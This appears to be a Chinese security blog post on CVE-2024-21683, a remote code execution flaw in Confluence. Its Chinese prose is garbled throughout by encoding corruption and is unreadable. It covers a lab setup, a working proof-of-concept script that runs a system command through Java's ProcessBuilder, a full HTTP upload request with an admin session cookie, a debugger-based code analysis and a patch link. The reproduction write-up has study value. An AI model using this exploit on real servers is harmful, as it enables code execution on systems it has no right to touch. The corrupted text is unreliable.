#  CVE-2024-21683ï¼šConfluenceè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´   
åŸåˆ› è‰¯å¤œ  Timeline Sec   2024-07-09 18:30  
  
>   
> å…³æ³¨æˆ‘ä»¬â¤ï¸ï¼Œæ·»åŠ æ˜Ÿæ ‡ğŸŒŸï¼Œä¸€èµ·å­¦å®‰å…¨ï¼ä½œè€…ï¼šè‰¯å¤œ@Timeline Sec æœ¬æ–‡å­—æ•°ï¼š3899é˜…è¯»æ—¶é•¿ï¼š3ï½5min å£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿ  
  
## 0x01 ç®€ä»‹  
  
Atlassian Confluenceæ˜¯ä¸€æ¬¾ç”±Atlassianå¼€å‘çš„ä¼ä¸šå›¢é˜Ÿåä½œå’ŒçŸ¥è¯†ç®¡ç†è½¯ä»¶ï¼Œæä¾›äº†ä¸€ä¸ªé›†ä¸­åŒ–çš„å¹³å°ï¼Œç”¨äºåˆ›å»ºã€ç»„ç»‡å’Œå…±äº«å›¢é˜Ÿçš„æ–‡æ¡£ã€çŸ¥è¯†åº“ã€é¡¹ç›®è®¡åˆ’å’Œåä½œå†…å®¹ï¼Œä»è€Œæœ‰æ•ˆåœ°ç®¡ç†é¡¹ç›®çŸ¥è¯†å’Œä¿¡æ¯ã€‚Confluence è¿˜é›†æˆäº†å¤šç§å®å’Œæ’ä»¶ï¼Œå¦‚æ—¥ç¨‹è¡¨ã€ä»»åŠ¡åˆ—è¡¨å’ŒJiraé›†æˆã€‚  
## 0x02 æ¼æ´æ¦‚è¿°  
  
**æ¼æ´ç¼–å·ï¼šCVE-2024-21683**  
  
ç»è¿‡ç®¡ç†å‘˜èº«ä»½éªŒè¯çš„è¿œç¨‹å¨èƒè€…å¯æ„é€ æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨å—å½±å“çš„å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œè€Œæ— éœ€ç”¨æˆ·äº¤äº’ã€‚  
## 0x03 å½±å“ç‰ˆæœ¬  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GP2ib34qCOspQD672uh3jvW0mQ29pkIHu0qibbNIlKzwkrPS9cnCicN15vg/640?wx_fmt=png&from=appmsg "")  
## 0x04 ç¯å¢ƒæ­å»º  
  
æ¼æ´ç¯å¢ƒå¯ä»¥ä½¿ç”¨vulhubä¸Šç°æˆçš„dockerç¯å¢ƒï¼š  
  
https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2023-22527  
  
å¯ä»¥é¡ºä¾¿ä¿®æ”¹docker-compose.ymlæ–‡ä»¶ï¼ŒæŠŠå®¹å™¨5005ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„5005ç«¯å£æ–¹ä¾¿åé¢è°ƒè¯•  
  
docker-compose up -d Â å¯åŠ¨ç¯å¢ƒå³å¯  
  
è®¿é—®8090ç«¯å£ï¼Œè¿›è¡Œå®‰è£…å‘å¯¼ï¼Œä¼šè¦æ±‚å¡«å†™è®¸å¯è¯å¯†é’¥ï¼Œéœ€è¦å‘ Atlassian ç”³è¯· Confluence Server æµ‹è¯•è¯ä¹¦  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPR6yPiaw4RNXP8osL25msh570y6B1noQjUrHXPCz9kNIJib4IoI9RpFtQ/640?wx_fmt=png&from=appmsg "")  
  
ç„¶åé…ç½®æ•°æ®åº“ï¼Œå¡«å†™æ•°æ®åº“åœ°å€dbã€æ•°æ®åº“åç§°confluenceã€ç”¨æˆ·åpostgresã€å¯†ç postgresã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPcUzucYcxVb2JUW23w2tq6cGw0xQ9mcJfmraxflK388ko0EAVV4u5QQ/640?wx_fmt=png&from=appmsg "")  
  
ç­‰å¾…å®‰è£…å®Œæˆå³å¯  
## 0x05 æ¼æ´å¤ç°  
  
1.ç™»å½•ç®¡ç†å‘˜åå°ã€‚åœ¨é…ç½®ä»£ç å®ä¸­ï¼Œé€‰æ‹©javaScriptï¼Œæ·»åŠ æ–°è¯­è¨€ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPw6xLzCF7SAYV8fzdiaqib64QIkwAod7D3FGxAaNiaaZOaomWUwahZict0A/640?wx_fmt=png&from=appmsg "")  
  
2.åœ¨ä¸Šä¼ é¡µé¢ä¸­æ·»åŠ exp.jsã€‚ä»£ç æ–‡ä»¶exp.jså†…å®¹ä¸ºä¸‹é¢çš„ä»£ç ï¼š  
```
newÂ java.lang.ProcessBuilder["(java.lang.String[])"](["touch",Â "/tmp/CVE-2024-21683"]).start();Â 

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPlz6otVWCKdO2dC78XPfn9406guUMZ0wiagkfzqTpppFD3Hgh4SsnNkQ/640?wx_fmt=png&from=appmsg "")  
  
æ³¨æ„ï¼šä¹Ÿå¯ä»¥æ˜¯æ‰§è¡Œå…¶ä»–å‘½ä»¤  
  
ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨burpå‘é€è¯·æ±‚ï¼Œä½†è¦æ³¨æ„å¸¦ä¸Šç®¡ç†å‘˜Cookie  
```
POSTÂ /admin/plugins/newcode/addlanguage.actionÂ HTTP/1.1
Host:Â 192.168.199.202:8090
Content-Length:Â 530
Cache-Control:Â max-age=0
Upgrade-Insecure-Requests:Â 1
Origin:Â http://192.168.199.202:8090
Content-Type:Â multipart/form-data;Â boundary=----WebKitFormBoundary9ZTAmucIpsJkBqSw
User-Agent:Â Mozilla/5.0Â (WindowsÂ NTÂ 10.0;Â Win64;Â x64)Â AppleWebKit/537.36Â (KHTML,Â likeÂ Gecko)Â Chrome/126.0.0.0Â Safari/537.36
Accept:Â text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer:Â http://192.168.199.202:8090/admin/plugins/newcode/configure.action
Accept-Encoding:Â gzip,Â deflate
Accept-Language:Â zh-CN,zh;q=0.9
Cookie:Â JSESSIONID=E798362E7A06CF1087CC58A078F993A4
Connection:Â close

------WebKitFormBoundary9ZTAmucIpsJkBqSw
Content-Disposition:Â form-data;Â name="atl_token"

02b26de790c0e61a3e68012c4b3c4a7ab335556f
------WebKitFormBoundary9ZTAmucIpsJkBqSw
Content-Disposition:Â form-data;Â name="languageFile";Â filename="exp.js"
Content-Type:Â text/javascript

newÂ java.lang.ProcessBuilder["(java.lang.String[])"](["touch",Â "/tmp/CVE-2024-21683"]).start();Â 
------WebKitFormBoundary9ZTAmucIpsJkBqSw
Content-Disposition:Â form-data;Â name="newLanguageName"

exp
------WebKitFormBoundary9ZTAmucIpsJkBqSw--

```  
  
3ã€ç™»å½•å®¹å™¨æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œç»“æœï¼ŒæˆåŠŸåˆ›å»ºäº†æ–‡ä»¶  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GP906ekfjgkQicb4d0JRPyDWggGlv3oMRuicrfR836iaiblG8yWGcQ9EycNQ/640?wx_fmt=png&from=appmsg "")  
## 0x06 æ¼æ´åˆ†æ  
  
æˆ‘ä»¬é€šè¿‡è¿œç¨‹è°ƒè¯•ï¼Œå…·ä½“çœ‹ä¸€ä¸‹ã€‚  
  
é¦–å…ˆåœ¨dockerç¯å¢ƒä¸­å¯¼å‡ºè¿œç¨‹è°ƒè¯•ä½¿ç”¨çš„ç¯å¢ƒã€‚  
  
ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹è½½åŒç‰ˆæœ¬çš„æºç ï¼š  
  
https://product-downloads.atlassian.com/software/confluence/downloads/atlassian-confluence-8.5.3.zip  
  
javaç¯å¢ƒçš„è¯ä¹Ÿè¦ä¿è¯æ˜¯åŒç‰ˆæœ¬çš„ï¼ˆå®¹å™¨æ˜¯Linuxçš„ï¼Œæˆ‘åœ¨windowsä¸Šè°ƒè¯•ï¼‰  
```
dockerÂ cpÂ 0a55c16e8262:/opt/atlassian/confluenceÂ /root/confluence
dockerÂ cpÂ 0a55c16e8262:/opt/java/openjdkÂ /root/openjdk

```  
  
å¯¼å…¥IDEAä¸­ï¼ŒSDKé…ç½®ä¸ºjava11ï¼Œå°†WEB-INFç›®å½•ä¸‹çš„libã€atlassian-bundled-pluginsã€atlassian-bundled-plugins-setup æ·»åŠ ä¸ºé¡¹ç›®Library  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPT1xTHbwc0hHqzwqia6UaPjrFZ05BbNc3kJqIIdvicCy9cLENJwZegiabQ/640?wx_fmt=png&from=appmsg "")  
  
ä¿®æ”¹dockerå®¹å™¨ä¸­confluenceå¯åŠ¨è„šæœ¬å¢åŠ è¿œç¨‹è°ƒè¯•ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯setenv.shè„šæœ¬,è·¯å¾„ä¸º/opt/atlassian/confluence/bin/setenv.shï¼Œåœ¨export CATALINA_OPTSå‰é¢å¢åŠ ã€‚  
```
CATALINA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005Â ${CATALINA_OPTS}"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPKHqrEdAR16Q72BfwiaN0UdUgeicG3fEuzy9cl2zcexYupA8NMkYgd9VA/640?wx_fmt=png&from=appmsg "")  
  
ç¼–è¾‘å®Œæˆåå¿…é¡»è¦é‡å¯docker å®¹å™¨ï¼Œæ‰èƒ½ç”Ÿæ•ˆ  
  
ç„¶åé…ç½®IDEAä¸­çš„JVMè¿œç¨‹è°ƒè¯•ï¼Œé…ç½®IPå’Œç«¯å£  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPnXTywvjO4485aqLlMLwiaIszf6PwQhIrmkltO4EliaxlfzxStNcHciclA/640?wx_fmt=png&from=appmsg "")  
  
å¯åŠ¨è°ƒè¯•ï¼Œæç¤ºå¦‚ä¸‹è¯´æ˜è¿œç¨‹è°ƒè¯•è¿æ¥æˆåŠŸ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPwA5xeumo8icVblrdYnAeicg8sLaszFDuCFyRIKvtTJT2aHsyOeuNfrdw/640?wx_fmt=png&from=appmsg "")  
  
æ¼æ´ç‚¹å¯¹åº”åŠŸèƒ½ç‚¹åœ¨ ../admin/plugins/newcode/addlanguage.action,è¿™é‡Œæ˜¯ä»£ç å®ç®¡ç†->æ·»åŠ æ–°è¯­è¨€çš„ä½ç½®ã€‚newcodeæ’ä»¶åœ¨com.atlassian.confluence.ext.newcode-macro-plugin-xxx.jarï¼Œå…³é”®çš„å‡½æ•°æ˜¯initStandardObjects()å‡½æ•°  
  
æˆ‘ä»¬å®šä½åˆ°com/atlassian/confluence/ext/code/languages/impl/RhinoLanguageParse  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GP9HyUgxJ4hJEyWAegAwwPxiaY7f83X6FjRAHB7J6SgAhZkL4H5zcyCQg/640?wx_fmt=png&from=appmsg "")  
  
parseLanguage()å‡½æ•°ä¸­çš„scriptStringæ˜¯å¯æ§å˜é‡å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ æ—¶è¾“å…¥çš„jsä¸­çš„å†…å®¹ã€‚è¿™é‡Œè°ƒç”¨äº†initSafeStandardObjectsæ–¹æ³•ï¼Œè·Ÿè¿›  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPrOd5O4og8p7CDDOL3gnpT4QYLFxntt8rKeCiccykm3X6UFCl9icHUrog/640?wx_fmt=png&from=appmsg "")  
  
è¿™ä¸ªå‡½æ•°è°ƒç”¨initSafeStandardObjectså‡½æ•°ï¼Œæ­¤å¤–è¿˜åŠ è½½Packagesã€JavaAdapterå’ŒJavaImporteç±»ä»¥åŠgetClasså‡½æ•°çš„åˆå§‹åŒ–æ“ä½œï¼Œå°†å¸¸è§çš„é¡¶éƒ¨åŒ…æ”¾åˆ°äº†"java", "javax", "org", "com", "edu", "net"ï¼Œé€šè¿‡LazilyLoadedCtorç±»è°ƒç”¨è¿™äº›å‚æ•°ï¼Œå…è®¸ä»JSä¸­è°ƒç”¨JAVAå¯¹è±¡  
  
initSafeStandardObjectsåˆå§‹åŒ–åï¼ŒevaluateStringæ–¹æ³•å°±èƒ½æ‰§è¡Œ JavaScript è„šæœ¬  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPTB3ico1x73qFA8rvofoIzBvtlgyuic8xlyFtBc9UmCF3n5ATSdd908bA/640?wx_fmt=png&from=appmsg "")  
  
æˆ‘ä»¬è·Ÿè¿›evaluateStringæ–¹æ³•ï¼Œè¿™é‡Œä¼šç¼–è¯‘ä¼ å…¥çš„è„šæ­¥æºä»£ç ï¼Œç¼–è¯‘å¤±è´¥è¿”å›nullï¼ŒæˆåŠŸåˆ™è°ƒç”¨execæ–¹æ³•æ‰§è¡Œå¹¶å°†ç»“æœè¿”å›  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjLogZ4wQRv6uMNOOqlJ6GPAuDHoO5sobMzAvNAMWekvlLoJD6xfibLiaOw0I8B90JAe9BicxHkZLSVw/640?wx_fmt=png&from=appmsg "")  
## ä¿®å¤æ–¹å¼  
  
ç›®å‰å®˜æ–¹å·²å‘å¸ƒå®‰å…¨æ›´æ–°ï¼Œå—å½±å“ç”¨æˆ·å¯ä»¥æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š  
  
https://www.atlassian.com/software/confluence/download-archives  
## å‚è€ƒé“¾æ¥  
  
https://github.com/W01fh4cker/CVE-2024-21683-RCE  
  
https://www.freebuf.com/vuls/402197.html  
## Checklist  
  
CVE-2024-21683[CVE-2023-22527](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247493886&idx=1&sn=5017675ae43c9df2c3527de1750857db&chksm=903ace0ea74d4718788dfb6fba489918e2bffc98a4967e7b77e4d97f5bd45a598a8a1b7771aa&scene=21#wechat_redirect)  
[CVE-2023-22515](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247492841&idx=1&sn=8ea05eaa317ed8dae5701812fb5742a1&chksm=903ac219a74d4b0f3e3e82cedc94ebeb5d952ab3ecd5cf4bee76f5642320f9832216a247390e&scene=21#wechat_redirect)  
[CVE-2022-26138](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247490609&idx=1&sn=eb47834f70a7608f59739d1331c89598&chksm=90393ac1a74eb3d764e9378b2cead991968dc10f4c7accd38d022eb78f30e5977f20d3abd03e&scene=21#wechat_redirect)  
CVE-2022-26134  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
å›å¤  
ã€åŠ ç¾¤ã€‘  
è¿›å…¥å¾®ä¿¡äº¤æµç¾¤å›å¤  
ã€SRCç¾¤ã€‘è¿›å…¥SRC-QQäº¤æµç¾¤å›å¤  
ã€æ–°äººã€‘é¢†å–æ–°äººå­¦ä¹ æŒ‡å—èµ„æ–™å›å¤  
ã€é¢è¯•ã€‘è·å–æ¸—é€æµ‹è¯•å¸¸è§é¢è¯•é¢˜å›å¤  
ã€åˆä½œã€‘è·å–å„ç±»å®‰å…¨é¡¹ç›®åˆä½œæ–¹å¼å›å¤  
ã€å¸®ä¼šã€‘ä»˜è´¹åŠ å…¥SRCçŸ¥è¯†åº“å­¦ä¹ å›å¤  
ã€  
åŸ¹è®­ã€‘è·å–TimelineSecå®˜æ–¹åŸ¹è®­è¯¾ç¨‹è¯¦æƒ…  
  
  
è§†é¢‘å·ï¼šæœç´¢  
TimelineSec  
  
å®˜æ–¹å¾®åšï¼š[#å°ç¨‹åº://å¾®åš/tPbUYdN9EucSD4C]()  
  
  
å“”å“©å“”å“©ï¼š  
https://space.bilibili.com/52459  
â€1903  
  
  
  
â¤  
  
è§‰å¾—æœ‰ç”¨å°±æ”¶è—èµ·æ¥å§ï¼  
  
é¡ºä¾¿ç‚¹ä¸ªèµå’Œåœ¨çœ‹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
